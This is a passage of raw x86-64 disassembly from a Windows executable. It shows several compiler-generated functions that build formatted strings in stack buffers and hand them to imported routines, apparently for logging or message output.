   140002623:	56                   	push   %rsi
   140002624:	57                   	push   %rdi
   140002625:	b8 38 20 00 00       	mov    $0x2038,%eax
   14000262a:	e8 a1 a2 00 00       	call   0x14000c8d0
   14000262f:	48 2b e0             	sub    %rax,%rsp
   140002632:	48 8b 05 07 ca 03 00 	mov    0x3ca07(%rip),%rax        # 0x14003f040
   140002639:	48 33 c4             	xor    %rsp,%rax
   14000263c:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   140002643:	00 
   140002644:	49 8b f0             	mov    %r8,%rsi
   140002647:	48 63 da             	movslq %edx,%rbx
   14000264a:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002650:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002655:	49 8b e9             	mov    %r9,%rbp
   140002658:	48 8b f9             	mov    %rcx,%rdi
   14000265b:	e8 b0 6d 00 00       	call   0x140009410
   140002660:	44 8b 8c 24 80 20 00 	mov    0x2080(%rsp),%r9d
   140002667:	00 
   140002668:	33 c9                	xor    %ecx,%ecx
   14000266a:	48 85 c0             	test   %rax,%rax
   14000266d:	74 14                	je     0x140002683
   14000266f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002674:	4c 8b c6             	mov    %rsi,%r8
   140002677:	48 8d 14 5a          	lea    (%rdx,%rbx,2),%rdx
   14000267b:	ff 15 a7 9d 02 00    	call   *0x29da7(%rip)        # 0x14002c428
   140002681:	eb 0d                	jmp    0x140002690
   140002683:	48 8d 14 3b          	lea    (%rbx,%rdi,1),%rdx
   140002687:	4c 8b c5             	mov    %rbp,%r8
   14000268a:	ff 15 a0 9d 02 00    	call   *0x29da0(%rip)        # 0x14002c430
   140002690:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   140002697:	00 
   140002698:	48 33 cc             	xor    %rsp,%rcx
   14000269b:	e8 30 9f 00 00       	call   0x14000c5d0
   1400026a0:	48 81 c4 38 20 00 00 	add    $0x2038,%rsp
   1400026a7:	5f                   	pop    %rdi
   1400026a8:	5e                   	pop    %rsi
   1400026a9:	5d                   	pop    %rbp
   1400026aa:	5b                   	pop    %rbx
   1400026ab:	c3                   	ret
   1400026ac:	cc                   	int3
   1400026ad:	cc                   	int3
   1400026ae:	cc                   	int3
   1400026af:	cc                   	int3
   1400026b0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400026b5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400026ba:	53                   	push   %rbx
   1400026bb:	55                   	push   %rbp
   1400026bc:	56                   	push   %rsi
   1400026bd:	57                   	push   %rdi
   1400026be:	48 83 ec 38          	sub    $0x38,%rsp
   1400026c2:	49 8b f0             	mov    %r8,%rsi
   1400026c5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400026ca:	48 8b da             	mov    %rdx,%rbx
   1400026cd:	48 8b f9             	mov    %rcx,%rdi
   1400026d0:	e8 6b e9 ff ff       	call   0x140001040
   1400026d5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400026da:	4c 8b ce             	mov    %rsi,%r9
   1400026dd:	4c 8b c3             	mov    %rbx,%r8
   1400026e0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400026e7:	00 00 
   1400026e9:	48 8b d7             	mov    %rdi,%rdx
   1400026ec:	48 8b 08             	mov    (%rax),%rcx
   1400026ef:	48 83 c9 01          	or     $0x1,%rcx
   1400026f3:	e8 30 27 01 00       	call   0x140014e28
   1400026f8:	85 c0                	test   %eax,%eax
   1400026fa:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400026ff:	0f 48 c1             	cmovs  %ecx,%eax
   140002702:	48 83 c4 38          	add    $0x38,%rsp
   140002706:	5f                   	pop    %rdi
   140002707:	5e                   	pop    %rsi
   140002708:	5d                   	pop    %rbp
   140002709:	5b                   	pop    %rbx
   14000270a:	c3                   	ret
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002715:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000271a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000271f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002724:	53                   	push   %rbx
   140002725:	55                   	push   %rbp
   140002726:	56                   	push   %rsi
   140002727:	57                   	push   %rdi
   140002728:	41 56                	push   %r14
   14000272a:	b8 40 10 00 00       	mov    $0x1040,%eax
   14000272f:	e8 9c a1 00 00       	call   0x14000c8d0
   140002734:	48 2b e0             	sub    %rax,%rsp
   140002737:	48 8b 05 02 c9 03 00 	mov    0x3c902(%rip),%rax        # 0x14003f040
   14000273e:	48 33 c4             	xor    %rsp,%rax
   140002741:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002748:	00 
   140002749:	48 8b e9             	mov    %rcx,%rbp
   14000274c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002753:	00 
   140002754:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002759:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000275e:	33 f6                	xor    %esi,%esi
   140002760:	e8 67 2d 01 00       	call   0x1400154cc
   140002765:	44 8b c8             	mov    %eax,%r9d
   140002768:	4c 8d 05 d9 a4 02 00 	lea    0x2a4d9(%rip),%r8        # 0x14002cc48
   14000276f:	48 8d 05 b2 a5 02 00 	lea    0x2a5b2(%rip),%rax        # 0x14002cd28
   140002776:	8b d3                	mov    %ebx,%edx
   140002778:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000277d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002782:	e8 f9 f4 ff ff       	call   0x140001c80
   140002787:	85 c0                	test   %eax,%eax
   140002789:	78 19                	js     0x1400027a4
   14000278b:	48 63 c8             	movslq %eax,%rcx
   14000278e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002793:	8b f0                	mov    %eax,%esi
   140002795:	48 03 f9             	add    %rcx,%rdi
   140002798:	2b d8                	sub    %eax,%ebx
   14000279a:	b8 00 00 00 00       	mov    $0x0,%eax
   14000279f:	0f 49 c3             	cmovns %ebx,%eax
   1400027a2:	8b d8                	mov    %eax,%ebx
   1400027a4:	48 63 db             	movslq %ebx,%rbx
   1400027a7:	e8 94 e8 ff ff       	call   0x140001040
   1400027ac:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400027b1:	4c 8b cd             	mov    %rbp,%r9
   1400027b4:	4c 8b c3             	mov    %rbx,%r8
   1400027b7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400027be:	00 00 
   1400027c0:	48 8b d7             	mov    %rdi,%rdx
   1400027c3:	48 8b 08             	mov    (%rax),%rcx
   1400027c6:	48 83 c9 02          	or     $0x2,%rcx
   1400027ca:	e8 05 24 01 00       	call   0x140014bd4
   1400027cf:	4c 8d 0d 5a a5 02 00 	lea    0x2a55a(%rip),%r9        # 0x14002cd30
   1400027d6:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400027dd:	00 
   1400027de:	4c 8d 05 63 a5 02 00 	lea    0x2a563(%rip),%r8        # 0x14002cd48
   1400027e5:	8b d6                	mov    %esi,%edx
   1400027e7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400027ec:	e8 2f fe ff ff       	call   0x140002620
   1400027f1:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   1400027f8:	00 
   1400027f9:	48 33 cc             	xor    %rsp,%rcx
   1400027fc:	e8 cf 9d 00 00       	call   0x14000c5d0
   140002801:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002808:	41 5e                	pop    %r14
   14000280a:	5f                   	pop    %rdi
   14000280b:	5e                   	pop    %rsi
   14000280c:	5d                   	pop    %rbp
   14000280d:	5b                   	pop    %rbx
   14000280e:	c3                   	ret
   14000280f:	cc                   	int3
   140002810:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002815:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000281a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000281f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002824:	53                   	push   %rbx
   140002825:	55                   	push   %rbp
   140002826:	56                   	push   %rsi
   140002827:	57                   	push   %rdi
   140002828:	41 56                	push   %r14
   14000282a:	b8 40 20 00 00       	mov    $0x2040,%eax
   14000282f:	e8 9c a0 00 00       	call   0x14000c8d0
   140002834:	48 2b e0             	sub    %rax,%rsp
   140002837:	48 8b 05 02 c8 03 00 	mov    0x3c802(%rip),%rax        # 0x14003f040
   14000283e:	48 33 c4             	xor    %rsp,%rax
   140002841:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002848:	00 
   140002849:	48 8b e9             	mov    %rcx,%rbp
   14000284c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002853:	00 
   140002854:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002859:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000285e:	33 f6                	xor    %esi,%esi
   140002860:	e8 67 2c 01 00       	call   0x1400154cc
   140002865:	44 8b c8             	mov    %eax,%r9d
   140002868:	4c 8d 05 e9 a3 02 00 	lea    0x2a3e9(%rip),%r8        # 0x14002cc58
   14000286f:	48 8d 05 f2 a4 02 00 	lea    0x2a4f2(%rip),%rax        # 0x14002cd68
   140002876:	8b d3                	mov    %ebx,%edx
   140002878:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000287d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002882:	e8 29 fe ff ff       	call   0x1400026b0
   140002887:	85 c0                	test   %eax,%eax
   140002889:	78 1a                	js     0x1400028a5
   14000288b:	48 63 c8             	movslq %eax,%rcx
   14000288e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002893:	2b d8                	sub    %eax,%ebx
   140002895:	8b f0                	mov    %eax,%esi
   140002897:	b8 00 00 00 00       	mov    $0x0,%eax
   14000289c:	0f 49 c3             	cmovns %ebx,%eax
   14000289f:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   1400028a3:	8b d8                	mov    %eax,%ebx
   1400028a5:	48 63 db             	movslq %ebx,%rbx
   1400028a8:	e8 93 e7 ff ff       	call   0x140001040
   1400028ad:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400028b2:	4c 8b cd             	mov    %rbp,%r9
   1400028b5:	4c 8b c3             	mov    %rbx,%r8
   1400028b8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400028bf:	00 00 
   1400028c1:	48 8b d7             	mov    %rdi,%rdx
   1400028c4:	48 8b 08             	mov    (%rax),%rcx
   1400028c7:	48 83 c9 01          	or     $0x1,%rcx
   1400028cb:	e8 58 25 01 00       	call   0x140014e28
   1400028d0:	8b c6                	mov    %esi,%eax
   1400028d2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400028d7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400028dd:	4c 8d 05 64 a4 02 00 	lea    0x2a464(%rip),%r8        # 0x14002cd48
   1400028e4:	33 c9                	xor    %ecx,%ecx
   1400028e6:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   1400028ea:	ff 15 38 9b 02 00    	call   *0x29b38(%rip)        # 0x14002c428
   1400028f0:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400028f7:	00 
   1400028f8:	48 33 cc             	xor    %rsp,%rcx
   1400028fb:	e8 d0 9c 00 00       	call   0x14000c5d0
   140002900:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002907:	41 5e                	pop    %r14
   140002909:	5f                   	pop    %rdi
   14000290a:	5e                   	pop    %rsi
   14000290b:	5d                   	pop    %rbp
   14000290c:	5b                   	pop    %rbx
   14000290d:	c3                   	ret
   14000290e:	cc                   	int3
   14000290f:	cc                   	int3
   140002910:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002915:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000291a:	53                   	push   %rbx
   14000291b:	55                   	push   %rbp
   14000291c:	56                   	push   %rsi
   14000291d:	57                   	push   %rdi
   14000291e:	41 54                	push   %r12
   140002920:	41 55                	push   %r13
   140002922:	41 56                	push   %r14
   140002924:	41 57                	push   %r15
   140002926:	b8 48 10 00 00       	mov    $0x1048,%eax
   14000292b:	e8 a0 9f 00 00       	call   0x14000c8d0
   140002930:	48 2b e0             	sub    %rax,%rsp
   140002933:	48 8b 05 06 c7 03 00 	mov    0x3c706(%rip),%rax        # 0x14003f040
   14000293a:	48 33 c4             	xor    %rsp,%rax
   14000293d:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002944:	00 
   140002945:	45 33 ed             	xor    %r13d,%r13d
   140002948:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   14000294d:	41 8b ed             	mov    %r13d,%ebp
   140002950:	4d 8b f0             	mov    %r8,%r14
   140002953:	44 8b e2             	mov    %edx,%r12d
   140002956:	4c 8b f9             	mov    %rcx,%r15
   140002959:	bf 00 10 00 00       	mov    $0x1000,%edi
   14000295e:	e8 69 2b 01 00       	call   0x1400154cc
   140002963:	44 8b c8             	mov    %eax,%r9d
   140002966:	4c 8d 05 0b a3 02 00 	lea    0x2a30b(%rip),%r8        # 0x14002cc78
   14000296d:	8b d7                	mov    %edi,%edx
   14000296f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002974:	e8 07 f3 ff ff       	call   0x140001c80
   140002979:	85 c0                	test   %eax,%eax
   14000297b:	78 17                	js     0x140002994
   14000297d:	48 63 c8             	movslq %eax,%rcx
   140002980:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140002985:	8b e8                	mov    %eax,%ebp
   140002987:	48 03 f1             	add    %rcx,%rsi
   14000298a:	2b f8                	sub    %eax,%edi
   14000298c:	41 8b c5             	mov    %r13d,%eax
   14000298f:	0f 49 c7             	cmovns %edi,%eax
   140002992:	8b f8                	mov    %eax,%edi
   140002994:	48 63 df             	movslq %edi,%rbx
   140002997:	e8 a4 e6 ff ff       	call   0x140001040
   14000299c:	4d 8b ce             	mov    %r14,%r9
   14000299f:	4c 8b c3             	mov    %rbx,%r8
   1400029a2:	48 8b d6             	mov    %rsi,%rdx
   1400029a5:	48 8b 08             	mov    (%rax),%rcx
   1400029a8:	48 8d 84 24 a8 10 00 	lea    0x10a8(%rsp),%rax
   1400029af:	00 
   1400029b0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400029b5:	48 83 c9 02          	or     $0x2,%rcx
   1400029b9:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400029be:	e8 11 22 01 00       	call   0x140014bd4
   1400029c3:	85 c0                	test   %eax,%eax
   1400029c5:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400029ca:	0f 48 c1             	cmovs  %ecx,%eax
   1400029cd:	85 c0                	test   %eax,%eax
   1400029cf:	78 0c                	js     0x1400029dd
   1400029d1:	48 63 d0             	movslq %eax,%rdx
   1400029d4:	48 03 f2             	add    %rdx,%rsi
   1400029d7:	2b f8                	sub    %eax,%edi
   1400029d9:	41 0f 48 fd          	cmovs  %r13d,%edi
   1400029dd:	41 8b cc             	mov    %r12d,%ecx
   1400029e0:	e8 47 2a 01 00       	call   0x14001542c
   1400029e5:	48 63 d7             	movslq %edi,%rdx
   1400029e8:	4c 8d 05 99 a2 02 00 	lea    0x2a299(%rip),%r8        # 0x14002cc88
   1400029ef:	4d 8b cf             	mov    %r15,%r9
   1400029f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029f7:	48 8b ce             	mov    %rsi,%rcx
   1400029fa:	e8 81 f2 ff ff       	call   0x140001c80
   1400029ff:	4c 8d 0d 2a a3 02 00 	lea    0x2a32a(%rip),%r9        # 0x14002cd30
   140002a06:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002a0d:	00 
   140002a0e:	4c 8d 05 33 a3 02 00 	lea    0x2a333(%rip),%r8        # 0x14002cd48
   140002a15:	8b d5                	mov    %ebp,%edx
   140002a17:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002a1c:	e8 ff fb ff ff       	call   0x140002620
   140002a21:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002a28:	00 
   140002a29:	48 33 cc             	xor    %rsp,%rcx
   140002a2c:	e8 9f 9b 00 00       	call   0x14000c5d0
   140002a31:	48 81 c4 48 10 00 00 	add    $0x1048,%rsp
   140002a38:	41 5f                	pop    %r15
   140002a3a:	41 5e                	pop    %r14
   140002a3c:	41 5d                	pop    %r13
   140002a3e:	41 5c                	pop    %r12
   140002a40:	5f                   	pop    %rdi
   140002a41:	5e                   	pop    %rsi
   140002a42:	5d                   	pop    %rbp
   140002a43:	5b                   	pop    %rbx
   140002a44:	c3                   	ret
   140002a45:	cc                   	int3
   140002a46:	cc                   	int3
   140002a47:	cc                   	int3
   140002a48:	cc                   	int3
   140002a49:	cc                   	int3
   140002a4a:	cc                   	int3
   140002a4b:	cc                   	int3
   140002a4c:	cc                   	int3
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002a55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002a5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002a5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002a64:	53                   	push   %rbx
   140002a65:	55                   	push   %rbp
   140002a66:	56                   	push   %rsi
   140002a67:	57                   	push   %rdi
   140002a68:	41 56                	push   %r14
   140002a6a:	b8 40 10 00 00       	mov    $0x1040,%eax
   140002a6f:	e8 5c 9e 00 00       	call   0x14000c8d0
   140002a74:	48 2b e0             	sub    %rax,%rsp
   140002a77:	48 8b 05 c2 c5 03 00 	mov    0x3c5c2(%rip),%rax        # 0x14003f040
   140002a7e:	48 33 c4             	xor    %rsp,%rax
   140002a81:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002a88:	00 
   140002a89:	48 8b e9             	mov    %rcx,%rbp
   140002a8c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002a93:	00 
   140002a94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002a99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002a9e:	33 f6                	xor    %esi,%esi
   140002aa0:	e8 27 2a 01 00       	call   0x1400154cc
   140002aa5:	44 8b c8             	mov    %eax,%r9d
   140002aa8:	4c 8d 05 99 a1 02 00 	lea    0x2a199(%rip),%r8        # 0x14002cc48
   140002aaf:	48 8d 05 42 a2 02 00 	lea    0x2a242(%rip),%rax        # 0x14002ccf8
   140002ab6:	8b d3                	mov    %ebx,%edx
   140002ab8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002abd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002ac2:	e8 b9 f1 ff ff       	call   0x140001c80
   140002ac7:	85 c0                	test   %eax,%eax
   140002ac9:	78 19                	js     0x140002ae4
   140002acb:	48 63 c8             	movslq %eax,%rcx
   140002ace:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002ad3:	8b f0                	mov    %eax,%esi
   140002ad5:	48 03 f9             	add    %rcx,%rdi
   140002ad8:	2b d8                	sub    %eax,%ebx
   140002ada:	b8 00 00 00 00       	mov    $0x0,%eax
   140002adf:	0f 49 c3             	cmovns %ebx,%eax
   140002ae2:	8b d8                	mov    %eax,%ebx
   140002ae4:	48 63 db             	movslq %ebx,%rbx
   140002ae7:	e8 54 e5 ff ff       	call   0x140001040
   140002aec:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002af1:	4c 8b cd             	mov    %rbp,%r9
   140002af4:	4c 8b c3             	mov    %rbx,%r8
   140002af7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002afe:	00 00 
   140002b00:	48 8b d7             	mov    %rdi,%rdx
   140002b03:	48 8b 08             	mov    (%rax),%rcx
   140002b06:	48 83 c9 02          	or     $0x2,%rcx
   140002b0a:	e8 c5 20 01 00       	call   0x140014bd4
   140002b0f:	4c 8d 0d ea a1 02 00 	lea    0x2a1ea(%rip),%r9        # 0x14002cd00
   140002b16:	c7 44 24 20 30 00 00 	movl   $0x30,0x20(%rsp)
   140002b1d:	00 
   140002b1e:	4c 8d 05 f3 a1 02 00 	lea    0x2a1f3(%rip),%r8        # 0x14002cd18
   140002b25:	8b d6                	mov    %esi,%edx
   140002b27:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b2c:	e8 ef fa ff ff       	call   0x140002620
   140002b31:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002b38:	00 
   140002b39:	48 33 cc             	xor    %rsp,%rcx
   140002b3c:	e8 8f 9a 00 00       	call   0x14000c5d0
   140002b41:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002b48:	41 5e                	pop    %r14
   140002b4a:	5f                   	pop    %rdi
   140002b4b:	5e                   	pop    %rsi
   140002b4c:	5d                   	pop    %rbp
   140002b4d:	5b                   	pop    %rbx
   140002b4e:	c3                   	ret
   140002b4f:	cc                   	int3
   140002b50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002b55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002b5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002b5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002b64:	53                   	push   %rbx
   140002b65:	55                   	push   %rbp
   140002b66:	56                   	push   %rsi
   140002b67:	57                   	push   %rdi
   140002b68:	41 56                	push   %r14
   140002b6a:	b8 40 20 00 00       	mov    $0x2040,%eax
   140002b6f:	e8 5c 9d 00 00       	call   0x14000c8d0
   140002b74:	48 2b e0             	sub    %rax,%rsp
   140002b77:	48 8b 05 c2 c4 03 00 	mov    0x3c4c2(%rip),%rax        # 0x14003f040
   140002b7e:	48 33 c4             	xor    %rsp,%rax
   140002b81:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002b88:	00 
   140002b89:	48 8b e9             	mov    %rcx,%rbp
   140002b8c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002b93:	00 
   140002b94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002b99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002b9e:	33 f6                	xor    %esi,%esi
   140002ba0:	e8 27 29 01 00       	call   0x1400154cc
   140002ba5:	44 8b c8             	mov    %eax,%r9d
   140002ba8:	4c 8d 05 a9 a0 02 00 	lea    0x2a0a9(%rip),%r8        # 0x14002cc58
   140002baf:	48 8d 05 a2 a1 02 00 	lea    0x2a1a2(%rip),%rax        # 0x14002cd58
   140002bb6:	8b d3                	mov    %ebx,%edx
   140002bb8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002bbd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002bc2:	e8 e9 fa ff ff       	call   0x1400026b0
   140002bc7:	85 c0                	test   %eax,%eax
   140002bc9:	78 1a                	js     0x140002be5
   140002bcb:	48 63 c8             	movslq %eax,%rcx
   140002bce:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002bd3:	2b d8                	sub    %eax,%ebx
   140002bd5:	8b f0                	mov    %eax,%esi
   140002bd7:	b8 00 00 00 00       	mov    $0x0,%eax
   140002bdc:	0f 49 c3             	cmovns %ebx,%eax
   140002bdf:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   140002be3:	8b d8                	mov    %eax,%ebx
   140002be5:	48 63 db             	movslq %ebx,%rbx
   140002be8:	e8 53 e4 ff ff       	call   0x140001040
   140002bed:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002bf2:	4c 8b cd             	mov    %rbp,%r9
   140002bf5:	4c 8b c3             	mov    %rbx,%r8
   140002bf8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002bff:	00 00 
   140002c01:	48 8b d7             	mov    %rdi,%rdx
   140002c04:	48 8b 08             	mov    (%rax),%rcx
   140002c07:	48 83 c9 01          	or     $0x1,%rcx
   140002c0b:	e8 18 22 01 00       	call   0x140014e28
   140002c10:	8b c6                	mov    %esi,%eax
   140002c12:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002c17:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002c1d:	4c 8d 05 f4 a0 02 00 	lea    0x2a0f4(%rip),%r8        # 0x14002cd18
   140002c24:	33 c9                	xor    %ecx,%ecx
   140002c26:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002c2a:	ff 15 f8 97 02 00    	call   *0x297f8(%rip)        # 0x14002c428
   140002c30:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140002c37:	00 
   140002c38:	48 33 cc             	xor    %rsp,%rcx
   140002c3b:	e8 90 99 00 00       	call   0x14000c5d0
   140002c40:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002c47:	41 5e                	pop    %r14
   140002c49:	5f                   	pop    %rdi
   140002c4a:	5e                   	pop    %rsi
   140002c4b:	5d                   	pop    %rbp
   140002c4c:	5b                   	pop    %rbx
   140002c4d:	c3                   	ret
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002c55:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002c5a:	53                   	push   %rbx
   140002c5b:	55                   	push   %rbp
   140002c5c:	56                   	push   %rsi
   140002c5d:	57                   	push   %rdi
   140002c5e:	41 54                	push   %r12
   140002c60:	41 55                	push   %r13
   140002c62:	41 56                	push   %r14
   140002c64:	41 57                	push   %r15
   140002c66:	b8 58 20 00 00       	mov    $0x2058,%eax
   140002c6b:	e8 60 9c 00 00       	call   0x14000c8d0
   140002c70:	48 2b e0             	sub    %rax,%rsp
   140002c73:	48 8b 05 c6 c3 03 00 	mov    0x3c3c6(%rip),%rax        # 0x14003f040
   140002c7a:	48 33 c4             	xor    %rsp,%rax
   140002c7d:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   140002c84:	00 
   140002c85:	45 33 ed             	xor    %r13d,%r13d
   140002c88:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002c8d:	41 8b ed             	mov    %r13d,%ebp
   140002c90:	4d 8b f8             	mov    %r8,%r15
   140002c93:	44 8b e2             	mov    %edx,%r12d
   140002c96:	4c 8b f1             	mov    %rcx,%r14
   140002c99:	bf 00 10 00 00       	mov    $0x1000,%edi
   140002c9e:	e8 29 28 01 00       	call   0x1400154cc
   140002ca3:	44 8b c8             	mov    %eax,%r9d
   140002ca6:	4c 8d 05 e3 9f 02 00 	lea    0x29fe3(%rip),%r8        # 0x14002cc90
   140002cad:	8b d7                	mov    %edi,%edx
   140002caf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002cb4:	e8 f7 f9 ff ff       	call   0x1400026b0
   140002cb9:	85 c0                	test   %eax,%eax
   140002cbb:	78 18                	js     0x140002cd5
   140002cbd:	48 63 c8             	movslq %eax,%rcx
   140002cc0:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002cc5:	8b e8                	mov    %eax,%ebp
   140002cc7:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002ccb:	8b cf                	mov    %edi,%ecx
   140002ccd:	2b c8                	sub    %eax,%ecx
   140002ccf:	41 8b fd             	mov    %r13d,%edi
   140002cd2:	0f 49 f9             	cmovns %ecx,%edi
   140002cd5:	48 63 df             	movslq %edi,%rbx
   140002cd8:	e8 63 e3 ff ff       	call   0x140001040
   140002cdd:	4d 8b cf             	mov    %r15,%r9
   140002ce0:	4c 8b c3             	mov    %rbx,%r8
   140002ce3:	48 8b d6             	mov    %rsi,%rdx
   140002ce6:	48 8b 08             	mov    (%rax),%rcx
   140002ce9:	48 8d 84 24 b8 20 00 	lea    0x20b8(%rsp),%rax
   140002cf0:	00 
   140002cf1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002cf6:	48 83 c9 01          	or     $0x1,%rcx
   140002cfa:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140002cff:	e8 24 21 01 00       	call   0x140014e28
   140002d04:	85 c0                	test   %eax,%eax
   140002d06:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140002d0b:	0f 48 c1             	cmovs  %ecx,%eax
   140002d0e:	85 c0                	test   %eax,%eax
   140002d10:	78 0d                	js     0x140002d1f
   140002d12:	48 63 c8             	movslq %eax,%rcx
   140002d15:	2b f8                	sub    %eax,%edi
   140002d17:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d1b:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d1f:	48 63 d7             	movslq %edi,%rdx
   140002d22:	4c 8d 05 87 9f 02 00 	lea    0x29f87(%rip),%r8        # 0x14002ccb0
   140002d29:	4d 8b ce             	mov    %r14,%r9
   140002d2c:	48 8b ce             	mov    %rsi,%rcx
   140002d2f:	e8 7c f9 ff ff       	call   0x1400026b0
   140002d34:	85 c0                	test   %eax,%eax
   140002d36:	78 0d                	js     0x140002d45
